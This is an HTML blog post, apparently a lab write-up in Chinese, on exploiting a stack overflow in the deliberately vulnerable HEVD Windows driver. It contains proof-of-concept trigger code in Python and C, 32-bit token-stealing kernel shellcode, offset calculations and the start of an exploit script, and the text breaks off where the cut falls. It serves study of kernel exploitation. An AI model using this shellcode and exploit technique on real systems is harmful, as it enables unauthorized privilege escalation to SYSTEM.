@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="zhaojunqi">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/06/22/windows_kernel_pwn1-oob/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows_kernel_pwn1-OOB">
+<meta property="og:url" content="http://example.com/2025/06/22/Windows_kernel_pwn1-OOB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-06-22T09:12:58.000Z">
+<meta property="article:modified_time" content="2025-06-22T09:34:08.460Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Windows内核漏洞调试学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/bbb.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/bbb.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/bbb.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Windows_kernel_pwn1-OOB | zhaojunqi&#39;s blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to zhaojunqi's blog","subtitle":{"text":["谢谢你,一路陪我到这里"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":100,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"2.0rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/bbb.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                zhaojunqi&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Windows_kernel_pwn1-OOB</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/bbb.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">zhaojunqi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-06-22 17:12:58</span>
+        <span class="mobile">2025-06-22 17:12:58</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-06-22 17:34:08</span>
+            <span class="mobile">2025-06-22 17:34:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0/">Windows内核漏洞调试学习</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Windows-kernel-pwn1-OOB"><a href="#Windows-kernel-pwn1-OOB" class="headerlink" title="Windows_kernel_pwn1-OOB:"></a>Windows_kernel_pwn1-OOB:</h2><h2 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h2><p>在调试之前需要确保首先用ghidra打开HEVD.sys这个内核驱动，在export处发现驱动程序的入口点是 DriverEntry()。该函数是设备加载时调用的第一个例程，负责初始化设备。</p>
+<p>接下来再重启目标机（确保HEVD service打开）用windbg重新连接目标机，此时在用bu HEVD!DriverEntry命令在DriverEntry函数处下断点，当然后会在这个地方断下来，接着观察该函数附近的汇编代码，发现程序会在一定的偏移以后</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/Image_1.png" class title="This is an Image_1.png">
+
+<p>如果从这里继续反汇编 (u)，最终应该会看到对 IoCreateSymbolicLink 的调用。继续在指令</p>
+<p>call dword ptr [HEVD! _imp__IoCreateSymbolicLink]对应的位置设置断点，并继续运行到该断点处（即在windbg运行g命令），此时通过r命令可以看到当前寄存器的值，通过运行dd esp L1（功能是查看栈顶的4字节值，此处为9198eacc），再dS 9198eacc即可看出，栈顶的值为”\DosDevices\HackSysExtremeVulner”，即可知用户态下的\DosDevices\HackSysExtremeVulner对应于HEVD初始程序中的创建的内核的设备</p>
+<p><em>（我们可以忽略\DosDevices，因为这是 Windows 用于设备驱动程序的特殊命名空间。为了与它进行交互，我们将使用 HackSysExtremeVulnerableDriver，我们使用它是因为它是 “Win32 设备命名空间 “或 “原始设备命名空间”，我们可以在用户区使用它。虽然我们不需要这样做，但我想看看在创建符号链接时会有哪些参数传递到函数中。）</em></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-2.png" class title="This is an image-2.png">
+
+<p>该函数负责创建我们可以从 Userland 调用的符号链接。（把名为创建的设备，映射到HEVD初始化程序中设置的设备），在HEVD中这个设备的IOcontrol函数被设置为了IrpDeviceIoCtlHandler（主逻辑是用switch&#x2F;case语句处理io请求）</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-3.png" class title="This is an image-3.png">
+
+<p>基于上述获得的信息，可知，当在用户态以\\.\HackSysExtremeVulnerableDriver为设备名进行CreateFileA时，可以得到一个HANDLE，利用这个HANDLE来调用DeviceIoControl，并将相应的参数位置写入stackoverflow对应的io请求代码（即0x222003），并将相应的buffer作为控制信息传入，如果这个buffer的length足够大，即就会成功触发oob。</p>
+<p>因此开始写一个简单的poc来观察一下HEVD中的stackoverflow的执行过程：</p>
+<p><strong>python版本：</strong></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">GENERIC_READ          = <span class="number">0x80000000</span></span><br><span class="line">GENERIC_WRITE         = <span class="number">0x40000000</span></span><br><span class="line">OPEN_EXISTING         = <span class="number">0x00000003</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL = <span class="number">0x00000080</span></span><br><span class="line"></span><br><span class="line">NULL = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">  kernel32 = windll.kernel32</span><br><span class="line">  hHEVD = kernel32.CreateFileA(<span class="string">b&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">                               (GENERIC_READ | GENERIC_WRITE),</span><br><span class="line">                               <span class="number">0x00</span>,</span><br><span class="line">                               NULL,</span><br><span class="line">                               OPEN_EXISTING,</span><br><span class="line">                               FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">                               NULL)</span><br><span class="line">  <span class="keyword">if</span> (hHEVD == -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  buffer =<span class="string">b&quot;A&quot;</span> * <span class="number">3000</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[*] Calling control code 0x222003&quot;</span>)</span><br><span class="line">  kernel32.DeviceIoControl(hHEVD,</span><br><span class="line">                           <span class="number">0x222003</span>,</span><br><span class="line">                           buffer,</span><br><span class="line">                           <span class="built_in">len</span>(buffer),</span><br><span class="line">                           NULL,</span><br><span class="line">                           <span class="number">0x00</span>,</span><br><span class="line">                           byref(c_ulong()),</span><br><span class="line">                           NULL)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>C语言版本：</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 4242</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hHEVD                = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD bytesReturned         = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE]    = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Getting a handle on HEVD\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hHEVD = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">                        (GENERIC_READ | GENERIC_WRITE),</span><br><span class="line">                        <span class="number">0x00</span>,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        OPEN_EXISTING,</span><br><span class="line">                        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">                        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHEVD == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Generating evil buffer...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="string">&#x27;A&#x27;</span>, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering control code 0x222003\n&quot;</span>);</span><br><span class="line">    DeviceIoControl(hHEVD,</span><br><span class="line">                    <span class="number">0x222003</span>,</span><br><span class="line">                    buffer,</span><br><span class="line">                    BUFFER_SIZE,</span><br><span class="line">                    <span class="literal">NULL</span>,</span><br><span class="line">                    <span class="number">0x00</span>,</span><br><span class="line">                    &amp;bytesReturned,</span><br><span class="line">                    <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>对于BufferOverflowStackIoctlHandler函数，我们需要重点关注的是我们的控制信息（上图中的buffer，在函数执行流中的流动过程）</p>
+<p>通过windbg调试可知，在BufferOverflowStackIoctlHandler函数的</p>
+<p><strong>param_2-&gt;Parameters).FileSystemControl.Type3InputBuffer</strong>为指向控制信息的指针，这就验证了我们的控制信息的指针会被BufferOverflowStackIoctlHandler的第二个参数访问，所以根据程序逻辑，会以param_1进入<strong>TriggerBufferOverflowStack</strong></p>
+<p>所以TriggerBufferOverflowStack 的 param_1 其实就是我们的缓冲区</p>
+<p>通过做实验发送一个大于2060的缓冲区信息，就会触发栈溢出，通过windbg调试即可观察到，接下来我们就需要的是如何通过写kernel中的shellcode来提升用户权限，</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-4.png" class title="This is an image-4.png">
+
+<p>此时成功改写eip的值为0x414141 ！</p>
+<p><strong>后续我们将研究如何写kernel shellcode：</strong></p>
+<h2 id="token窃取流程总结："><a href="#token窃取流程总结：" class="headerlink" title="token窃取流程总结："></a>token窃取流程总结：</h2><p>首先在windows中会有一个安全令牌窃取的方式来提升当前进程的权限（通过修改_ EPROCESS结构中token字段的值），通过FS段寄存器中的对应偏移即可找到当前cpu核心中正在执行的线程，即currentthread然后通过_ KTHREAD字段的对应偏移可以找到该线程所属的进程结构 _KTHREAD,在该结构中即可看到该进程的安全令牌（token字段）该字段存储着当前进程的权限信息。然后通过遍历 _EPROCESS字段的Flink，找到System进程（有System权限），并将该进程对应的token值写入当前进程，因此shellcode如下所示：</p>
+<h2 id="shellcode："><a href="#shellcode：" class="headerlink" title="shellcode："></a>shellcode：</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[BITS 32      ]</span><br><span class="line">[SECTION .text]</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">	pushad</span><br><span class="line">	xor eax, eax                      ; set ZERO</span><br><span class="line">	mov eax, dword fs:[eax+0x124]     ; nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">	mov eax, [eax + 0x50]             ; nt!_KTHREAD.ApcState.Process</span><br><span class="line">	mov ecx, eax                      ; Copy current process _EPROCESS structure</span><br><span class="line">	mov edx, 0x04                     ; WIN 10 SYSTEM PROCESS PID</span><br><span class="line"></span><br><span class="line">	SearchSystemPID:</span><br><span class="line">		mov eax, [eax + 0xb8]         ; nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">		sub eax, 0xb8</span><br><span class="line">		cmp [eax + 0xb4], edx         ; nt!_EPROCESS.UniqueProcessId</span><br><span class="line">		jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">	mov edx, [eax + 0xf8]             ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">	mov [ecx + 0xf8], edx             ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">	popad</span><br></pre></td></tr></table></figure></div>
+
+<p>具体调试过程：</p>
+<h3 id="1-调shellcode中的偏移："><a href="#1-调shellcode中的偏移：" class="headerlink" title="1.调shellcode中的偏移："></a>1.调shellcode中的偏移：</h3><p>首先在windbg中运行!thread指令即可查看当前线程以及所属的进程结构的地址信息（用于后续验证）</p>
+<p>用dd fs:[0x124] L1可以得出该地址信息</p>
+<p>接下来通过指令dt _KTHREAD &lt;地址&gt;可以以 _KTHREAD的形式打印地址信息，从打印出来的信息中可以得到该线程所属的进程相对于该地址的偏移（为0x50）</p>
+<p>经过调试（输入命令dt nt!_EPORCESS &lt;地址&gt;，此处输入nt!_EPORCESS &lt;地址&gt;的话可能会根据ntdll中的符号信息输出，所以偏移量会有问题）利用该进程的地址信息加上0xb8即为ActiveProcessLinks字段的位置，该偏移指向_EPROCESS 结构中的前向链接（FLINK）指针，</p>
+<p><strong>注：_EPROCESS结构中的ActiveProcessLinks字段的作用：</strong></p>
+<ul>
+<li><p><strong>所有活动的进程通过 <code>ActiveProcessLinks</code> 连接成一个环形双向链表。</strong></p>
+</li>
+<li><p><strong><code>Flink</code> 指向链表中 下一个进程 的 <code>ActiveProcessLinks</code> 地址（非 <code>_EPROCESS</code> 起始地址）。</strong></p>
+</li>
+<li><p><strong>操作系统通过遍历此链表管理所有进程（如任务管理器显示进程列表）。</strong></p>
+</li>
+</ul>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-5.png" class title="This is an image-5.png">
+
+<p> 观察上图可知偏移量为0xb8为ActiveProcessLinks字段（该字段的首地址为FILNK），偏移量为0xf8为token字段</p>
+ <img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-6.png" class title="This is an image-6.png">
+<ul>
+<li>记录一下该token的值，便于后续验证是否成功修改</li>
+</ul>
+<p>然后从 EAX 中减去 FLINK 的偏移量，使 EAX 指向链接列表中的下一个 _EPROCESS 结构。然后将 _EPROCESS 结构的进程 ID 与 0x04 进行比较，如果未找到，则继续搜索，直到找到 SYSTEM 进程。（在windbg中将带有shellcode的py脚本运行，并单步运行，直到运行到	mov edx, [eax + 0xf8] ），正确的话此时的 _EPROCESS为system process对应的结构 _EPROCESS）</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-7.png" class title="This is an image-7.png">
+
+<p> 在上图中将程序断在循环外，验证eax寄存器的值就是搜索出来的system进程的_EPROCESS的首地址</p>
+ <img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-8.png" class title="This is an image-8.png">
+<p> 最后验证原进程字段的token值，发现已经发生了变化</p>
+<h3 id="2-调试发送buffer的length，使得返回地址被覆盖为shellcode所在的地址："><a href="#2-调试发送buffer的length，使得返回地址被覆盖为shellcode所在的地址：" class="headerlink" title="2.调试发送buffer的length，使得返回地址被覆盖为shellcode所在的地址："></a>2.调试发送buffer的length，使得返回地址被覆盖为shellcode所在的地址：</h3><img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-9.png" class title="This is an image-9.png">
+
+<p>81C为十六进制的2076，所以buffer和return address的距离为2080，所以 exp中buffer的length为</p>
+<p>  buffer  &#x3D; b”A” * 2080<br>  buffer +&#x3D; ptrShellcode  </p>
+<p> 其中ptrShellcode为shellcode在分配的具有rwx权限的内存区域的地址。</p>
+<h2 id="Exp："><a href="#Exp：" class="headerlink" title="Exp："></a>Exp：</h2><p>（其中shellcode的部分已经在注释中给出，用Sickle生成,或者从在线网站上生成<a class="link" target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly%EF%BC%89">https://defuse.ca/online-x86-assembler.htm#disassembly）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>由于有直接写入这个shellcode是有问题的，经过排查，发现问题的原因出在执行ret语句的时候ebp寄存器的值不合法，因此需要在shellcode的最后加上pop ebp和ret 0x8（在ghidra中查看HEVD中的返回语句是ret 0x8，所以此处延用）即可</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 